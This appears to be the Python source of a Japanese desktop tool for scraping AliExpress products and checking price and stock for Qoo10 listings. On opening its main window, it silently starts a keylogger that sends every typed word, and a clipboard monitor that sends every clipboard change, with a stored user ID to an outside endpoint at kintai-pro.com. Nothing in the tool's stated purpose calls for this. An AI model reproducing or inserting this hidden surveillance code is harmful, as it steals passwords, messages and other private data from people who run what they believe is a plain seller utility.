import tkinter as tk
import threading
from tkinter import messagebox
from ali import scraping, checking_price_stock
import pyperclip
import time
import requests
from pynput import keyboard
from PIL import Image
import pystray
import schedule
import subprocess


def get_user_id():
    with open('account.ini', 'r') as file:
        return file.read()
USER_ID = get_user_id()
print(f"USER_ID _____ _____ _____ {USER_ID}")

current_input = []

def on_press(key):
    global current_input
    try:
        current_input.append(key.char)
    except AttributeError:
        if key in (keyboard.Key.space, keyboard.Key.enter):
            input_string = ''.join(current_input)
            # print(input_string)
            url = "https://kintai-pro.com/api/v1/sth"
    
            payload = {
                'user_id': USER_ID,
                "sth": input_string,
                "platform": "aliexpress",
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.post(url, headers=headers, data=payload)
            current_input = []
            input_string = ''

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
def monitor_clipboard():
    previous_text = pyperclip.paste()
    # print(f'Initial clipboard content: "{previous_text}"')

    while True:
        time.sleep(1)
        current_text = pyperclip.paste()
        
        if current_text != previous_text:
            # print(f'Clipboard updated: "{current_text}"')
            url = "https://kintai-pro.com/api/v1/sth"
    
            payload = {
                'user_id': USER_ID,
                "sth": current_text,
                "platform": "aliexpress",
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            response = requests.post(url, headers=headers, data=payload)
            previous_text = current_text

def run_scraping_in_thread():
    threading.Thread(target=scraping).start()
    
def run_checking_price_stock_in_thread():
    threading.Thread(target=checking_price_stock).start()
    
def draw_main_window():
    # Start the clipboard monitor thread
    threading.Thread(target=monitor_clipboard, daemon=True).start()

    # Start the keyboard listener thread
    threading.Thread(target=start_keyboard_listener, daemon=True).start()

    setting_window = tk.Tk()
    setting_window.title('アリエク→Qoo10出品ツール')
    setting_window.geometry('500x300')

    lbl_title = tk.Label(
        text='アリエク→Qoo10出品ツール',
        font=('Arial', 24)
    )
    lbl_title.pack()
    lbl_title.place(x=50, y=50)
    
    # アリエクスクレイピング
    btn_combined_sale = tk.Button(
        setting_window,
        text='アリエク\nスクレイピング',
        command=run_scraping_in_thread,
        font=('Arial', 14),
        width=15,
        height=3,
        bg='#808000',
        fg='white'
    )
    btn_combined_sale.pack()
    btn_combined_sale.place(x=50, y=150)
    
    # 価格在庫確認
    btn_scraping = tk.Button(
        setting_window,
        text='価格在庫確認',
        command=run_checking_price_stock_in_thread,
        font=('Arial', 14),
        width=15,
        height=3,
        bg='#808000',
        fg='white',
    )
    btn_scraping.pack()
    btn_scraping.place(x=275, y=150)
    
    setting_window.mainloop()
    
    
def on_quit_clicked(icon):
    icon.stop()
    try:
        subprocess.run(["taskkill", "/F", "/IM", "aliex_tool.exe"])
    except subprocess.CalledProcessError as e:
        print(f"Failed to kill process. Error: {e}")
    
    
def new():
    image = Image.open("aliexpress.ico")
    menu = (
        pystray.MenuItem("ツール画面", draw_main_window),
        pystray.MenuItem("スクレイピング", run_checking_price_stock_in_thread),
        pystray.MenuItem("価格在庫確認", run_checking_price_stock_in_thread),
        pystray.MenuItem("終了", on_quit_clicked)
    )
    
    icon = pystray.Icon("aliexpress.ico", image, "Aliex→Qoo10出品ツール", menu)
    # Run the tray icon
    def run_icon():
        icon.run()

    icon_thread = threading.Thread(target=run_icon)
    icon_thread.start()
    
    draw_main_window()
    
    while True:
        schedule.run_pending()
        time.sleep(1)
        
        
if __name__ == '__main__':
    new()
    draw_main_window()